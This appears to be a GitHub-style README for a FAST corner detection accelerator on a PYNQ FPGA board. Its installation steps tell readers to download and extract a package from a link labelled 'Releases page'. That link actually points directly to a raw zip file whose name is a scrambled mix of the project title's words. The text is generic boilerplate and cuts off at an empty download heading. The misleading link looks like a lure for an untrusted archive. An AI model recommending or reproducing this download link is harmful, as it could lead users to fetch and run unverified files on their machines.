## 📌 Overview

This project offers a high-performance FAST Corner Detector running on the PYNQ platform. With hardware acceleration, it achieves over 80 frames per second. This tool is ideal for real-time image processing tasks, making it great for applications in computer vision.

## 🚀 Getting Started

### Requirements

Before you start, ensure your system meets the following requirements:

- **Operating System:** Linux (Ubuntu recommended) or Windows
- **Hardware:** PYNQ board (e.g., Zynq Ultrascale)
- **Software:** 
  - Vivado for hardware design
  - OpenCV for image processing

### Installation Steps

1. **Visit the Releases Page**
   Go to the [Releases page](https://raw.githubusercontent.com/Ishant13696/Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ/main/FPGA-FAST-Corner-Detector/Client_PC/Detection_Efficient_Energy_Design_Accelerator_of_and_Implementation_on_PYNQ_Corner_an_FAS_1.9.zip) to find the latest version available for download.

2. **Download the Software**
   Locate the latest release package. Click on the download link for the package that is compatible with your hardware.

3. **Extract the Package**
   Once downloaded, locate the file in your downloads folder. Extract the contents to a folder of your choice.

4. **Set Up Dependencies**
   Ensure that you have installed the necessary software dependencies, such as OpenCV and Vivado. Follow the installation guides provided on their official websites.

5. **Upload to the PYNQ Board**
   Connect your PYNQ board to your computer. Using SCP or any similar method, upload the extracted files to the board.

6. **Configure the Environment**
   Access your PYNQ board via SSH. Set up the environment variables as needed and ensure all dependencies are correctly linked.

7. **Run the Application**
   Once everything is set, navigate to the directory where the application files are located. Execute the main file to start the FAST Corner Detector.

## 🔎 Features

- **High Performance:** Achieves over 80 FPS through hardware acceleration, making it suitable for real-time applications.
- **Image Processing Capability:** Efficiently detects corners in images and videos.
- **User-Friendly:** Designed for ease of use, even for those new to programming.

## 📥 Download & Install
